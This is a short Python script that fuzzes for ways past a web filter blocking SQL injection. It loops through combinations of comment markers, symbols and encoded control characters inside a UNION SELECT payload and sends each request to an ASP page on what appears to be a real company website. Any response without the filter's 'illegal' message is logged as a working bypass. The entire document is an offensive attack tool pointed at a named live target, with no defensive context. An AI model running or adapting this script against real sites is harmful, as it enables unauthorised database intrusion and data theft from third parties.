import requests
fuzz_zs = ['/*','*/','/*!','*','=','`','!','@','%','.','-','+','|','%00']
fuzz_sz = ['',' ']
fuzz_ch = ["%0a","%0b","%0c","%0d","%0e","%0f","%0g","%0h","%0i","%0j"]
fuzz = fuzz_zs+fuzz_sz+fuzz_ch
url_start = "http://www.huayuanqg.com/CompHonorBig.asp?id=31"
for a in fuzz:
	for b in fuzz:
		for c in fuzz:
			for d in fuzz:
				exp = "/*!union"+a+b+c+d+"select*/ 1,2,3"
				url = url_start+exp
				res = requests.get(url)
				if "非法" in res.text:
					print("can not fuzz it")
				else:
					print("Find Fuzz bypass:"+url)
					with open("fuzz.txt",'a',encoding='utf-8') as r:
						r.write(url+"\n")